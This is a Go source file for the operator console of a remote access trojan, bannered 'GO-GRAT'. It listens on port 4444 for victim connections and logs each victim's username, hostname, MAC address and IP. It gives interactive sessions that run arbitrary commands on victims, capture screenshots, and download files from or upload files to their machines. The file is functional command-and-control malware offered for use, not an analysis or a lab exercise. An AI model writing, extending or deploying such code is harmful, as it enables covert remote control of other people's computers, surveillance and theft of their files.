package main

import (
	"bufio"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	reset  = "\033[0m"
	red    = "\033[31m"
	green  = "\033[32m"
	yellow = "\033[33m"
	blue   = "\033[34m"
	purple = "\033[35m"
	cyan   = "\033[36m"
	white  = "\033[37m"
)

type TargetInfo struct {
	Username   string
	Hostname   string
	MACAddress string
	IP         string
}

var ips []net.Addr
var targets []net.Conn
var targetsInfo []TargetInfo
var mu sync.Mutex

func reliableRecv(target net.Conn) (map[string]interface{}, error) {
	lengthBytes := make([]byte, 4)
	_, err := io.ReadFull(target, lengthBytes)
	if err != nil {
		return nil, err
	}
	length := binary.BigEndian.Uint32(lengthBytes)
	dataBytes := make([]byte, length)
	_, err = io.ReadFull(target, dataBytes)
	if err != nil {
		return nil, err
	}
	var jsonData map[string]interface{}
	err = json.Unmarshal(dataBytes, &jsonData)
	return jsonData, err
}

func reliableSend(target net.Conn, data map[string]interface{}) {
	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error while marshalling:", err)
		return
	}
	length := uint32(len(jsonData))
	lengthBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(lengthBytes, length)
	_, err = target.Write(lengthBytes)
	if err != nil {
		fmt.Println("Error while sending length:", err)
		return
	}
	_, err = target.Write(jsonData)
	if err != nil {
		fmt.Println("Error while sending data:", err)
	}
}
func sendFile(target net.Conn, filename string) error {
	reliableSend(target, map[string]interface{}{
		"command": fmt.Sprintf("upload %s", filename),
	})
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	fileInfo, err := file.Stat()
	if err != nil {
		return err
	}

	fileSize := make([]byte, 8)
	fileSizeInt := fileInfo.Size()
	for i := 0; i < 8; i++ {
		fileSize[i] = byte(fileSizeInt & 0xff)
		fileSizeInt >>= 8
	}

	_, err = target.Write(fileSize)
	if err != nil {
		return err
	}
	buffer := make([]byte, 4096)
	for {
		numBytes, err := file.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}

		_, err = target.Write(buffer[:numBytes])
		if err != nil {
			return err
		}
	}
	return nil
}
func downloadFile(target net.Conn, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	fileSizeBuffer := make([]byte, 8)
	_, err = target.Read(fileSizeBuffer)
	if err != nil {
		return fmt.Errorf("error receiving file size from the client: %v", err)
	}

	fileSizeInt := int64(0)
	for i := 7; i >= 0; i-- {
		fileSizeInt <<= 8
		fileSizeInt |= int64(fileSizeBuffer[i])
	}

	buffer := make([]byte, 4096)
	var totalBytesReceived int64
	for totalBytesReceived < fileSizeInt {
		numBytes, err := target.Read(buffer)
		if err != nil {
			return fmt.Errorf("error receiving file content from the client: %v", err)
		}

		totalBytesReceived += int64(numBytes)
		_, err = file.Write(buffer[:numBytes])
		if err != nil {
			return fmt.Errorf("error writing file content: %v", err)
		}
	}

	return nil
}
func ch_download(target net.Conn, filename string) {
	reliableSend(target, map[string]interface{}{
		"command": fmt.Sprintf("download %s", filename),
	})
	nude, err := reliableRecv(target)
	if err != nil {
		fmt.Println("Error receiving response:", err)
		return
	}
	if response, ok := nude["response"]; ok {
		if strResponse, ok := response.(string); ok {
			if strings.Contains(strResponse, "File Exists") {
				fmt.Println("\nDownloading File From Client")
				err := downloadFile(target, filename)
				if err != nil {
					fmt.Println("Error recieving file from client:", err)
					return
				}

				fmt.Println("File downloaded from  client.")
			} else if strings.Contains(strResponse, "File Not Found") {
				fmt.Println("File not occured")
			} else {
				fmt.Println("error occured")
			}
		}
	} else {
		fmt.Println("No response key in the message")
	}
}
func shell(target net.Conn, ip net.Addr, hostname string) {
	reader := bufio.NewReader(os.Stdin)
	for {
		ipStr := strings.Split(ip.String(), ":")[0]
		timestamp := time.Now().Format("15:04:05")
		fmt.Printf("%s[%s] %s", purple, timestamp, reset)
		fmt.Printf("%s%s@%s %s", yellow, hostname, ipStr, reset)
		fmt.Printf("%s> %s", cyan, reset)
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading command:", err)
			continue
		}
		command = strings.TrimRight(command, "\r\n")

		if command == "q" {
			break
		} else if command == "info" {
			reliableSend(target, map[string]interface{}{"command": command})
			clientInfo, err := reliableRecv(target)
			if err != nil {
				fmt.Println("Error receiving client info:", err)
				break
			}
			username := clientInfo["username"].(string)
			hostname := clientInfo["hostname"].(string)
			macAddress := clientInfo["macAddress"].(string)

			fmt.Printf("%s%-16s %-16s %-17s%s\n", blue, "USERNAME", "HOSTNAME", "MAC ADDRESS", reset)
			fmt.Printf("%s%-16s %-16s %-17s%s\n", white, username, hostname, macAddress, reset)

		} else if strings.HasPrefix(command, "screen") {
			reliableSend(target, map[string]interface{}{"command": command})
			messag, err := reliableRecv(target)
			if err != nil {
				fmt.Println("Error receiving response:", err)
				break
			}
			if response, ok := messag["response"]; ok {
				fmt.Println(response)
				if strResponse, ok := response.(string); ok && strings.Contains(strResponse, "Screenshot saved to::") {
					path := strings.TrimSpace(strings.Split(strResponse, "::")[1])
					ch_download(target, path)
				}
			} else {
				fmt.Println("No response key in the message")
			}

		}  else if strings.HasPrefix(command, "download ") {
			filename := command[9:]
			ch_download(target, filename)
		} else if strings.HasPrefix(command, "upload ") {
			filename := command[7:]
			err := sendFile(target, filename)
			if err != nil {
				fmt.Println("Error recieving file from client:", err)
				return
			}

			fmt.Println("File upload to  client.")
			continue
		} else if command == "kill" {
			target.Close()
			mu.Lock()
			for i, t := range targets {
				if t == target {
					targets = append(targets[:i], targets[i+1:]...)
					ips = append(ips[:i], ips[i+1:]...)
					targetsInfo = append(targetsInfo[:i], targetsInfo[i+1:]...)
					break
				}
			}
			mu.Unlock()
			break
		} else {
			reliableSend(target, map[string]interface{}{"command": command})
			message, err := reliableRecv(target)
			if err != nil {
				fmt.Println("Error receiving response:", err)
				break
			}
			if response, ok := message["response"]; ok {
				fmt.Println(response)
			} else {
				fmt.Println("No response key in the message")
			}
		}
	}
}

func printTargetsInfo() {
	mu.Lock()
	defer mu.Unlock()
	sessionWidth := len("SESSION")
	userWidth := len("USERNAME")
	hostWidth := len("HOSTNAME")
	macWidth := len("MAC ADDRESS")
	ipWidth := len("IP")

	for i, info := range targetsInfo {
		if l := len(fmt.Sprintf("%d", i)); l > sessionWidth {
			sessionWidth = l
		}
		if l := len(info.Username); l > userWidth {
			userWidth = l
		}
		if l := len(info.Hostname); l > hostWidth {
			hostWidth = l
		}
		if l := len(info.MACAddress); l > macWidth {
			macWidth = l
		}
		if l := len(info.IP); l > ipWidth {
			ipWidth = l
		}
	}
	repeat := func(n int) string { return strings.Repeat("-", n) }
	fmt.Printf("%s+%s+%s+%s+%s+%s+%s\n", cyan,
		repeat(sessionWidth+2),
		repeat(userWidth+2),
		repeat(hostWidth+2),
		repeat(macWidth+2),
		repeat(ipWidth+2),
		reset)
	fmt.Printf("%s| %-*s | %-*s | %-*s | %-*s | %-*s |%s\n", cyan,
		sessionWidth, "SESSION",
		userWidth, "USERNAME",
		hostWidth, "HOSTNAME",
		macWidth, "MAC ADDRESS",
		ipWidth, "IP",
		reset)
	fmt.Printf("%s+%s+%s+%s+%s+%s+%s\n", cyan,
		repeat(sessionWidth+2),
		repeat(userWidth+2),
		repeat(hostWidth+2),
		repeat(macWidth+2),
		repeat(ipWidth+2),
		reset)
	for i, info := range targetsInfo {
		fmt.Printf("%s| %-*d | %-*s | %-*s | %-*s | %-*s |%s\n", white,
			sessionWidth, i,
			userWidth, info.Username,
			hostWidth, info.Hostname,
			macWidth, info.MACAddress,
			ipWidth, info.IP,
			reset)
	}
	fmt.Printf("%s+%s+%s+%s+%s+%s+%s\n", cyan,
		repeat(sessionWidth+2),
		repeat(userWidth+2),
		repeat(hostWidth+2),
		repeat(macWidth+2),
		repeat(ipWidth+2),
		reset)
}

var connectedClients = make(map[string]bool)
func server() {
	listener, err := net.Listen("tcp", "0.0.0.0:4444")
	if err != nil {
		fmt.Println("Error while starting the server:", err)
		return
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		clientInfo, err := reliableRecv(conn)
		if err != nil {
			fmt.Println("Error receiving client info:", err)
			conn.Close()
			continue
		}
		username := clientInfo["username"].(string)
		hostname := clientInfo["hostname"].(string)
		macAddress := clientInfo["macAddress"].(string)
		ipStr := conn.RemoteAddr().String()
		ipParts := strings.Split(ipStr, ":")
		ip := ipParts[0]
		clientIdentifier := fmt.Sprintf("%s-%s-%s-%s", hostname, macAddress, username, ip)

		mu.Lock()
		if connectedClients[clientIdentifier] {
			mu.Unlock()
			conn.Close()
			continue
		}
		connectedClients[clientIdentifier] = true

		targetsInfo = append(targetsInfo, TargetInfo{
			Username:   username,
			Hostname:   hostname,
			MACAddress: macAddress,
			IP:         ip,
		})

		targets = append(targets, conn)
		ips = append(ips, conn.RemoteAddr())
		mu.Unlock()
		currentTime := time.Now().Format("2006-01-02 15:04:05")

		clientDetails := fmt.Sprintf("Time: %s , Hostname: %s , MAC Address: %s, Username: %s, IP: %s\n\n",
			currentTime, hostname, macAddress, username, ip)
		err = writeClientInfoToFile(clientDetails)
		if err != nil {
			fmt.Println("Error writing client info to file:", err)
		}

		fmt.Printf("%s[+] %s has connected!%s\n", green, ipStr, reset)
	}
}
func main() {
	if runtime.GOOS == "windows" {
		fmt.Print("\033[?25l")
	}
	fmt.Printf("%s\n", red)
	fmt.Println("            ____   ___        ____  ____      _    _____")
fmt.Println("           / ___| / _ \\      / ___||  _ \\    / \\  |_   _|")
fmt.Println("          | |  _ | | | |____| |  _ | |_) |  / _ \\   | |  ")
fmt.Println("          | |_| || |_| |____| |_| ||  _ <  / ___ \\  | |  ")
fmt.Println("           \\____| \\___/      \\____||_| \\_\\/_/   \\_\\ |_|  ")
fmt.Println("")

	fmt.Printf("                         %s{Coded By: machine1337}%s\n", yellow, red)
	fmt.Printf("%s\n", reset)
	go server()

	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Printf("\n%s[Server] Commands:%s\n", purple, reset)
		fmt.Printf("%s  targets  %s- list sessions\n", cyan, reset)
		fmt.Printf("%s  session# %s- connect to session (e.g. session id)\n", cyan, reset)
		fmt.Printf("%s  exit     %s- shutdown server\n", cyan, reset)
		fmt.Printf("%s> %s", yellow, reset)
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading command:", err)
			continue
		}
		command = strings.TrimRight(command, "\r\n")

		switch command {
		case "targets":
			printTargetsInfo()
		case "exit":
			mu.Lock()
			for _, target := range targets {
				target.Close()
			}
			mu.Unlock()
			return
		default:
			if len(command) >= 8 && command[:7] == "session" {
				num, err := strconv.Atoi(command[8:])
				if err != nil || num < 0 || num >= len(targets) {
					fmt.Println("No session id under that number")
					continue
				}
				target := targets[num]
				ip := ips[num]
				hostname := targetsInfo[num].Hostname
				shell(target, ip, hostname)
			}
		}
	}
}
func writeClientInfoToFile(info string) error {
	filePath := "clients_info.txt"
	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(info)
	if err != nil {
		return err
	}

	return nil
}
